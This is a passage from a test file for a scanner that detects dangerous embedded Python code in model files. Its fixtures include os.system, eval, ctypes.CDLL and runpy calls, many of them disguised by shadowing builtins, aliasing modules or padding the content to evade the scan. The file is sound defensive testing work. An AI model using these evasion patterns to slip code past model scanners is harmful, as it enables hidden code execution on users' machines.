            b"\x00\xffnext(iter([len]))([])\nunused = eval\n",
            b"\x00\xffdef payload():\n    return next(iter([len]))([])\nunused = eval\n",
            b"\x00\xffdef payload():\n    return next(iter([]), len)([])\nunused = eval\n",
            b"\x00\xffcallbacks = list([len])\ncallbacks[0]([])\nunused = eval\n",
            b"\x00\xffdef payload():\n    callbacks = list([len])\n    return callbacks[0]([])\nunused = eval\n",
            b"\x00\xffcallbacks = dict(sink=len)\ncallbacks['sink']([])\nunused = eval\n",
            (
                b"\x00\xffdef payload():\n"
                b"    callbacks = dict(run=len)\n"
                b"    return callbacks['run']([])\n"
                b"unused = eval\n"
            ),
            b"\x00\xffmatch [len]:\n    case [sink] | (sink,):\n        sink([])\nunused = eval\n",
            (
                b"\x00\xffdef payload():\n"
                b"    match [len]:\n"
                b"        case [callback] | (callback,):\n"
                b"            callback([])\n"
                b"unused = eval\n"
            ),
            (
                b"\x00\xffdef run(callbacks=[]):\n"
                b"    callbacks.append(len)\n"
                b"    return callbacks[0]([])\n"
                b"run()\n"
                b"unused = eval\n"
            ),
            (b"callbacks = {'run': len}\nfor callback in callbacks.values():\n    callback([])\nunused = eval\n"),
            (b"callbacks = {**{'run': len}}\ncallbacks['run']([])\nunused = eval\n"),
            (b"callbacks = [eval, len]\ncallbacks[1:][0]([])\n"),
            (b"callbacks = [eval] + [len]\ncallbacks[1]([])\n"),
            (b"callbacks = {**{'run': {'inner': eval}}, 'run': len}\ncallbacks['run']([])\n"),
            (
                b"def run(callback):\n"
                b"    callback('1+1')\n"
                b"callbacks = {**{'run': run}, 'run': len}\n"
                b"callbacks['run']([])\n"
                b"unused = eval\n"
            ),
            (b"class C:\n    def __call__(self, callback):\n        callback([])\nC()(len)\nunused = eval\n"),
            (b"class C:\n    def __new__(cls):\n        return len\nC()([])\nunused = eval\n"),
            (
                b"class C:\n"
                b"    def __new__(cls):\n"
                b"        return len\n"
                b"    def __call__(self, callback):\n"
                b"        callback('1+1')\n"
                b"C()(eval)\n"
            ),
            (b"callbacks = {len}\nfor callback in callbacks:\n    callback([])\nunused = eval\n"),
            (b"import builtins as b\nb.getattr(__builtins__, 'len')([])\nunused = eval\n"),
            (b"import builtins as b\nb.vars(__builtins__)['len']([])\nunused = eval\n"),
            (b"def configure():\n    globals()['sink'] = len\nconfigure()\nsink([])\nunused = eval\n"),
            (b"import operator\noperator.call(len, [])\nunused = eval\n"),
            (
                b"import operator\n"
                b"class Safe:\n"
                b"    call = staticmethod(lambda callback, value: value)\n"
                b"operator = Safe\n"
                b"operator.call(eval, '1+1')\n"
            ),
            (b"name = f'len'\ngetattr(__builtins__, name)([])\nunused = eval\n"),
            (b"callbacks = {'run': len}\ncallbacks.setdefault('run', eval)([])\n"),
            (b"callbacks = {'run': len}\ndict.get(callbacks, 'run')([])\nunused = eval\n"),
            (b"callbacks = [len]\nlist.__getitem__(callbacks, 0)([])\nunused = eval\n"),
            (b"staticmethod(len)([])\nunused = eval\n"),
            (b"callbacks = {-1: eval}\ncallbacks.pop()('1+1')\n"),
            (b"callbacks = [eval]\nlist.get(callbacks, 0)('1+1')\n"),
            (b"list(map(lambda callback: callback([]), [len]))\nunused = eval\n"),
            (b"def callbacks():\n    yield len\nfor callback in callbacks():\n    callback([])\nunused = eval\n"),
            (
                b"from functools import reduce\n"
                b"reduce(lambda _value, callback: callback([]), [len], None)\n"
                b"unused = eval\n"
            ),
            (b"try:\n    raise Exception(len)\nexcept Exception as error:\n    error.args[0]([])\nunused = eval\n"),
            (b"type(len).__call__(len, [])\nunused = eval\n"),
            (
                b"from __future__ import annotations\n"
                b"def annotated(value: eval):\n"
                b"    pass\n"
                b"annotated.__annotations__['value']('1+1')\n"
            ),
        ],
    )
    def test_scan_model_avoids_false_positives_across_callable_summaries(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)
        assert not any(finding.severity == "CRITICAL" for finding in findings)

    @pytest.mark.parametrize(
        ("data", "expected"),
        [
            (b"def get():\n    return {b'x': eval}\nget()[b'x']('1+1')\n", True),
            (
                b"def get():\n    return {b'x': len, b'unused': eval}\nget()[b'x']([])\n",
                False,
            ),
        ],
    )
    def test_scan_model_serializes_non_json_function_container_keys(
        self,
        data: bytes,
        expected: bool,
    ) -> None:
        detector = JITScriptDetector()

        findings = detector._extract_and_check_python_code(
            data,
            "Generic Python",
            "payload.py",
            include_full_source=True,
        )

        assert (
            any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings) is expected
        )

    def test_scan_model_keeps_late_full_source_candidates_after_priority_import(self) -> None:
        """An early priority import must not hide an aliased dangerous call in the middle of a large source."""
        detector = JITScriptDetector()
        padding = b"padding = 0\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"padding = 0\n") + 1
        )
        data = (
            b"import asyncio\n"
            + padding
            + b"def payload():\n    import os as alias\n    return alias.system('id')\n"
            + padding
        )

        candidates = jit_script_module._candidate_embedded_python_snippets(data, include_full_source=True)
        findings = detector._extract_and_check_python_code(
            data,
            "Generic Python",
            "payload.py",
            include_full_source=True,
        )

        assert len(candidates) <= jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 2
        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "OS command execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("callable_name", "expected_dangerous"),
        [("eval", True), ("len", False)],
    )
    def test_scan_model_keeps_late_block_candidates_after_priority_import(
        self,
        callable_name: str,
        expected_dangerous: bool,
    ) -> None:
        """An early priority import must not starve a later non-priority function block."""
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def harmless_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 6)
        )
        data = (
            b"import asyncio\n\x00"
            + leading_blocks
            + b"def payload():\n    runner = "
            + callable_name.encode()
            + b"\n    return runner('1+1')\n}\x00"
        )

        candidates = jit_script_module._candidate_embedded_python_snippets(data, include_full_source=True)
        findings = detector._extract_and_check_python_code(
            data,
            "Generic Python",
            "payload.py",
            include_full_source=True,
        )

        assert len(candidates) <= jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 2
        assert (
            any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)
            is expected_dangerous
        )

    def test_scan_model_keeps_unrelated_native_load_after_safe_runpy_overwrite(self) -> None:
        """A safe runpy member overwrite must not suppress an unrelated ctypes call."""
        detector = JITScriptDetector()
        data = b"\x00\xffimport runpy\nrunpy.run_path = print\nimport ctypes\nctypes.CDLL('libpayload.so')\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_keeps_other_runpy_member_after_safe_deferred_overwrite(self) -> None:
        """Call-specific runpy suppression must not erase a different dangerous member."""
        detector = JITScriptDetector()
        data = (
            b"from __future__ import annotations\n"
            b"import runpy as alias\n"
            b"alias.run_path = print\n"
            b"alias.run_path('safe')\n"
            b"alias.run_module('payload')\n"
        )

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_does_not_decode_unbounded_binary_for_suppression(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Suppression analysis must not allocate character offsets for the full model blob."""
        detector = JITScriptDetector()
        original_decode = jit_script_module._decode_utf8_with_byte_offsets

        def reject_unbounded_decode(data: bytes) -> tuple[str, list[int]]:
            assert len(data) <= jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES
            return original_decode(data)

        monkeypatch.setattr(jit_script_module, "_decode_utf8_with_byte_offsets", reject_unbounded_decode)
        data = b"import runpy\n" + b"\x00" * jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES

        findings = detector._extract_and_check_python_code(
            data,
            "Generic Python",
            "payload.bin",
            include_full_source=True,
        )

        assert not any(finding.type == "code_execution_pattern" for finding in findings)

    def test_scan_model_keeps_late_dangerous_call_after_safe_middle_call(self) -> None:
        """A safe middle call must not stop replay before a later dangerous member."""
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        data = (
            b"\x00\xffimport runpy as rp\n"
            + padding
            + b"original = rp.run_path\nrp.run_path = print\nimport builtins\n"
            + b"builtins.delattr = lambda *args: None\n"
            + b"delattr(rp, 'run_path')\nrp.__dict__.setdefault('run_path', original)\n"
            + b"rp.run_path('safe')\n"
            + padding
            + b"rp.run_module('payload')\n"
            + padding
        )

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "data",
        [
            (
                b"import webbrowser as wb\n"
                b"try:\n    unknown()\n    wb.open = print\nexcept Exception:\n    pass\n"
                b"wb.open('https://example.invalid')\n"
            ),
            (
                b"import webbrowser as wb\n"
                b"def print(*args):\n    return wb.open(*args)\n"
                b"wb.open = print\nwb.open('https://example.invalid')\n"
            ),
        ],
    )
    def test_scan_model_keeps_dangerous_typed_call_when_safe_overwrite_is_unproven(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("data", "expected_pattern"),
        [
            (
                b"import runpy as rp\ndef arm():\n    global print\n    print = eval\n"
                b"arm()\nrp.run_path = print\n((rp).run_path)('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy as rp\nbuiltins = fake\n"
                b"builtins.setattr(rp, 'run_path', print)\n((rp).run_path)('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import runpy as rp\nvars = lambda _: {}\nvars(rp).pop('run_path', None)\n"
                b"rp.__dict__.setdefault('run_path', print)\n((rp).run_path)('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb\ntry:\n    missing.attr = print\n    wb.open = print\n"
                b"except Exception:\n    pass\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
        ],
    )
    def test_scan_model_keeps_call_when_safe_overwrite_proof_is_untrusted(
        self,
        data: bytes,
        expected_pattern: str,
    ) -> None:
        findings = JITScriptDetector().scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    def test_scan_model_keeps_original_alias_after_uncertain_try_rebind(self) -> None:
        source = (
            b"import webbrowser as wb\nactual = wb\ntry:\n    wb = object()\n"
            b"except Exception:\n    pass\nwb.open = print\nactual.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_allows_safe_overwrite_after_non_raising_try(self) -> None:
        source = b"import webbrowser as wb\ntry:\n    wb.open = print\nexcept Exception:\n    pass\nwb.open('safe')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_keeps_original_alias_after_uncertain_try_star_rebind(self) -> None:
        if not hasattr(ast, "TryStar"):
            pytest.skip("except* requires Python 3.11+")
        source = (
            b"import webbrowser as wb\nactual = wb\ntry:\n    wb = object()\n"
            b"except* Exception:\n    pass\nwb.open = print\nactual.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "dict_shadow",
        [
            b"builtins.__dict__.update(dict=Safe)\n",
            b"setattr(builtins, 'dict', Safe)\n",
        ],
    )
    def test_scan_model_rejects_dict_update_after_builtin_dict_shadow(self, dict_shadow: bytes) -> None:
        source = (
            b"import builtins, webbrowser as wb\n"
            b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
            + dict_shadow
            + b"dict.update(wb.__dict__, open=print)\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_rejects_dict_update_after_walrus_builtin_dict_shadow(self) -> None:
        source = (
            b"import builtins, webbrowser as wb\n"
            b"class Safe:\n    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
            b"(mapping := builtins.__dict__).update(dict=Safe)\n"
            b"dict.update(wb.__dict__, open=print)\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_allows_safe_update_through_walrus_mapping_receiver(self) -> None:
        source = b"import webbrowser as wb\n(mapping := wb.__dict__).update(open=print)\nwb.open('safe')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "shadow_statement",
        [
            b"(vars := lambda _value: {})\nvars(wb).update(open=print)\n",
            b"((setattr := lambda *args: None), setattr(wb, 'open', print))\n",
        ],
    )
    def test_scan_model_rejects_safe_overwrite_through_walrus_shadowed_helper(
        self,
        shadow_statement: bytes,
    ) -> None:
        source = b"import webbrowser as wb\n" + shadow_statement + b"wb.open('https://example.invalid')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "alias_statement",
        [
            b"update: object = dict.update\nupdate(wb.__dict__, open=print)\n",
            b"mapping_type: object = dict\nmapping_type.update(wb.__dict__, open=print)\n",
        ],
    )
    def test_scan_model_allows_safe_overwrite_through_annotated_dict_helper_alias(
        self,
        alias_statement: bytes,
    ) -> None:
        source = b"import webbrowser as wb\n" + alias_statement + b"wb.open('safe')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_rejects_annotated_dict_update_alias_after_shadow(self) -> None:
        source = (
            b"import webbrowser as wb\nclass Safe:\n"
            b"    @staticmethod\n    def update(*args, **kwargs):\n        pass\n"
            b"dict = Safe\nupdate: object = dict.update\n"
            b"update(wb.__dict__, open=print)\nwb.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_preserves_safe_overwrite_across_sys_modules_setdefault(self) -> None:
        source = (
            b"import sys, webbrowser as wb\nwb.open = print\n"
            b"sys.modules.setdefault('webbrowser', object())\n"
            b"import webbrowser as wb2\nwb2.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_invalidates_safe_overwrite_across_sys_modules_setitem(self) -> None:
        source = (
            b"import sys, webbrowser as wb\nwb.open = print\n"
            b"sys.modules.__setitem__('webbrowser', object())\n"
            b"import webbrowser as wb2\nwb2.open('https://example.invalid')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("future_import", "should_detect"),
        [(b"", True), (b"from __future__ import annotations\n", False)],
    )
    def test_scan_model_respects_deferred_print_mutation_annotation(
        self,
        future_import: bytes,
        should_detect: bool,
    ) -> None:
        source = (
            future_import
            + b"import runpy as rp\nx: globals().update(print=eval)\n"
            + b"rp.run_path = print\nrp.run_path('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")
        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

        assert detected is should_detect

    @pytest.mark.parametrize(
        ("class_body", "should_detect"),
        [
            (b"    wb = object()\n    wb.open = print\n", True),
            (b"    marker = object()\n    wb.open = print\n", False),
        ],
    )
    def test_scan_model_keeps_class_local_module_alias_state(
        self,
        class_body: bytes,
        should_detect: bool,
    ) -> None:
        source = b"import webbrowser as wb\nclass C:\n" + class_body + b"wb.open('https://example.invalid')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")
        detected = any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

        assert detected is should_detect

    def test_scan_model_ignores_safe_class_local_module_alias_call(self) -> None:
        source = b"import webbrowser as wb\nclass C:\n    wb = object()\n    wb.open = print\n    wb.open('safe')\n"

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("source", "expected_pattern"),
        [
            (
                b"import webbrowser as wb, types\nclass Trap(types.ModuleType):\n"
                b"    def __setattr__(self, name, value):\n        if name == 'open':\n            return\n"
                b"        super().__setattr__(name, value)\nwb.__class__ = Trap\n"
                b"wb.open = print\nwb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"import ctypes as c, types\nclass Trap(types.ModuleType):\n"
                b"    def __setattr__(self, name, value):\n        if name == 'CDLL':\n            return\n"
                b"        super().__setattr__(name, value)\nsetattr(c, '__class__', Trap)\n"
                b"c.CDLL = print\nc.CDLL('payload.so')\n",
                "Native library loading detected",
            ),
            (
                b"import runpy as rp, types\nclass Trap(types.ModuleType):\n"
                b"    def __setattr__(self, name, value):\n        if name == 'run_path':\n            return\n"
                b"        super().__setattr__(name, value)\nrp.__class__ = Trap\n"
                b"rp.run_path = print\n((rp).run_path)('payload.py')\n",
                "Dynamic module execution detected",
            ),
            (
                b"import webbrowser as wb, types\noriginal = wb.open\nwb.open = print\n"
                b"class Trap(types.ModuleType):\n    def __getattribute__(self, name):\n"
                b"        if name == 'open':\n            return original\n"
                b"        return super().__getattribute__(name)\nwb.__class__ = Trap\n"
                b"wb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
        ],
    )
    def test_scan_model_keeps_call_after_module_class_mutation(
        self,
        source: bytes,
        expected_pattern: str,
    ) -> None:
        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == expected_pattern for finding in findings
        )

    def test_scan_model_ignores_unrelated_object_class_mutation_before_safe_overwrite(self) -> None:
        source = (
            b"import webbrowser as wb\nclass Base:\n    pass\nclass Trap(Base):\n    pass\n"
            b"holder = Base()\nholder.__class__ = Trap\nwb.open = print\nwb.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_allows_safe_overwrite_on_fresh_module_generation_after_class_mutation(self) -> None:
        source = (
            b"import webbrowser as old, types, sys\nclass Trap(types.ModuleType):\n    pass\n"
            b"old.__class__ = Trap\ndel sys.modules['webbrowser']\nimport webbrowser as fresh\n"
            b"fresh.open = print\nfresh.open('safe')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_keeps_cross_candidate_webbrowser_member_after_safe_call(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        data = (
            b"\x00\xffimport webbrowser as wb\n"
            + b"vars(wb).update(open=print)\nwb.open('safe')\n"
            + padding
            + b"wb.open_new('https://example.invalid')\n"
            + padding
        )

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_keeps_restored_runpy_member_after_safe_call(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        data = (
            b"\x00\xffimport runpy as rp\noriginal = rp.run_path\nrp.run_path = print\nrp.run_path('safe')\n"
            + padding
            + b"rp.run_path = original\nrp.run_path('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_keeps_runpy_alias_captured_before_safe_overwrite(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        data = (
            b"\x00\xffimport runpy as rp\ncaptured = rp.run_path\n"
            + padding
            + b"rp.run_path = print\ndel rp.run_path\n"
            + b"rp.__dict__.setdefault('run_path', print)\nrp.run_path('safe')\n"
            + padding
            + b"captured('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "data",
        [
            (
                b"from __future__ import annotations\nimport runpy as rp\n"
                b"setattr = print\nsetattr(rp, 'run_path', print)\nrp.run_path('payload.py')\n"
            ),
            (b"import runpy as rp\ncaptured = rp.run_path\nsetattr(rp, 'run_path', print)\ncaptured('payload.py')\n"),
            (
                b"import runpy as rp\noriginal = rp.run_path\ndef print(*args):\n    return original(*args)\n"
                b"rp.run_path = print\nrp.run_path('payload.py')\n"
            ),
            (
                b"import runpy as rp\noriginal = rp.run_path\ndef print(*args):\n    return original(*args)\n"
                b"del rp.run_path\nrp.__dict__.setdefault('run_path', print)\nrp.run_path('payload.py')\n"
            ),
        ],
    )
    def test_scan_model_keeps_runpy_calls_when_safe_overwrite_helpers_are_shadowed(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize("method", [b"pop", b"__delitem__"])
    def test_scan_model_keeps_runpy_call_after_shadowed_dict_descriptor_delete(self, method: bytes) -> None:
        arguments = b"rp.__dict__, 'run_path'" + (b", None" if method == b"pop" else b"")
        source = (
            b"import runpy as rp\ndict = fake\n"
            + b"dict."
            + method
            + b"("
            + arguments
            + b")\n"
            + b"rp.__dict__.setdefault('run_path', print)\n((rp).run_path)('payload.py')\n"
        )

        findings = JITScriptDetector().scan_model(source, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "setattr_shadow",
        [
            b"globals()['setattr'] = lambda *args: None\n",
            b"globals().update(setattr=lambda *args: None)\n",
            b"globals().update(**{'setattr': lambda *args: None})\n",
            b"namespace = globals()\nnamespace.__setitem__('setattr', lambda *args: None)\n",
            b"import builtins\nbuiltins.__dict__.update(setattr=lambda *args: None)\n",
            b"import builtins as b\nv = vars\nv(b).update(setattr=lambda *args: None)\n",
            b"d = dict\nd.__setitem__(__builtins__, 'setattr', lambda *args: None)\n",
            b"__builtins__.setattr = lambda *args: None\n",
            b"__builtins__['setattr'] = lambda *args: None\n",
        ],
    )
    def test_scan_model_keeps_runpy_call_after_module_setattr_shadow(self, setattr_shadow: bytes) -> None:
        detector = JITScriptDetector()
        data = (
            b"import runpy as rp\n"
            + setattr_shadow
            + b"setattr(rp, 'run_path', print)\n((rp).run_path)('payload.py')\n"
        )

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "setattr_shadow",
        [
            b"setattr = lambda *args: None\n",
            b"globals()['setattr'] = lambda *args: None\n",
            b"import builtins\nbuiltins.__dict__['setattr'] = lambda *args: None\n",
        ],
    )
    def test_scan_model_preserves_safe_runpy_overwrite_before_setattr_shadow(self, setattr_shadow: bytes) -> None:
        data = b"import runpy as rp\nsetattr(rp, 'run_path', print)\n" + setattr_shadow + b"rp.run_path('safe')\n"

        findings = JITScriptDetector().scan_model(data, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_preserves_safe_builtin_setattr_after_alias_reimport(self) -> None:
        padding = b"".join(f"value_{index} = {index}\n".encode() for index in range(20))
        data = (
            b"import runpy as rp\nbuiltins = object()\n"
            + padding
            + b"import builtins\nbuiltins.setattr(rp, 'run_path', print)\n"
            b"builtins = object()\nrp.run_path('safe')\n"
        )

        findings = JITScriptDetector().scan_model(data, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_rejects_transient_shadowed_builtin_setattr(self) -> None:
        data = (
            b"import runpy as rp\nfrom types import SimpleNamespace\n"
            b"builtins = SimpleNamespace(setattr=lambda *args: None)\n"
            b"builtins.setattr(rp, 'run_path', print)\nimport builtins\n"
            b"rp.run_path('payload.py')\n"
        )

        findings = JITScriptDetector().scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        "inactive_shadow",
        [
            "if False:\n    globals()['setattr'] = lambda *args: None\n",
            "globals = lambda: {}\nglobals()['setattr'] = lambda *args: None\n",
            "v = vars\nv = lambda _value: {}\nv(__builtins__).update(setattr=lambda *args: None)\n",
            "def helper():\n    setattr = lambda *args: None\n",
        ],
    )
    def test_inactive_setattr_shadow_keeps_safe_runpy_overwrite(self, inactive_shadow: str) -> None:
        source = "import runpy as rp\n" + inactive_shadow + "setattr(rp, 'run_path', print)\nrp.run_path('safe')\n"
        tree = ast.parse(source)

        assert not jit_script_module._compact_snippet_has_shadowed_setattr(tree)
        assert jit_script_module._compact_snippet_runpy_print_overwrite_calls(source) == {("runpy.run_path", "S108")}

    @pytest.mark.parametrize(
        "capture_block",
        [
            b"def helper():\n    captured = rp.run_path\n",
            b"if False:\n    captured = rp.run_path\n",
            b"class Holder:\n    captured = rp.run_path\n",
        ],
    )
    def test_scan_model_ignores_nested_or_inactive_runpy_capture(self, capture_block: bytes) -> None:
        detector = JITScriptDetector()
        data = b"import runpy as rp\n" + capture_block + b"rp.run_path = print\ncaptured('safe')\n"

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_keeps_constant_active_runpy_capture(self) -> None:
        detector = JITScriptDetector()
        data = (
            b"import runpy as rp\nif True:\n    captured = rp.run_path\nrp.run_path = print\ncaptured('payload.py')\n"
        )

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_keeps_runpy_call_after_destructured_member_restore(self) -> None:
        detector = JITScriptDetector()
        data = (
            b"import runpy as rp\noriginal = rp.run_path\nrp.run_path = print\n"
            b"(rp.run_path,) = (original,)\nrp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_ignores_destructured_safe_runpy_overwrite(self) -> None:
        detector = JITScriptDetector()
        data = b"import runpy as rp\nrp.run_path = print\n(rp.run_path,) = (print,)\nrp.run_path('safe')\n"

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_uses_explicit_builtins_setattr_after_local_shadow(self) -> None:
        detector = JITScriptDetector()
        data = (
            b"import builtins, runpy as rp\nsetattr = print\n"
            b"builtins.setattr(rp, 'run_path', print)\nrp.run_path('safe')\n"
        )

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_ignores_overwritten_runpy_capture(self) -> None:
        detector = JITScriptDetector()
        data = b"import runpy as rp\ncaptured = rp.run_path\ncaptured = print\nrp.run_path = print\ncaptured('safe')\n"

        findings = detector.scan_model(data, "pytorch", "payload.py")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Dynamic module execution detected"
            for finding in findings
        )

    def test_scan_model_keeps_propagated_runpy_capture_before_safe_overwrite(self) -> None:
        detector = JITScriptDetector()
        data = (
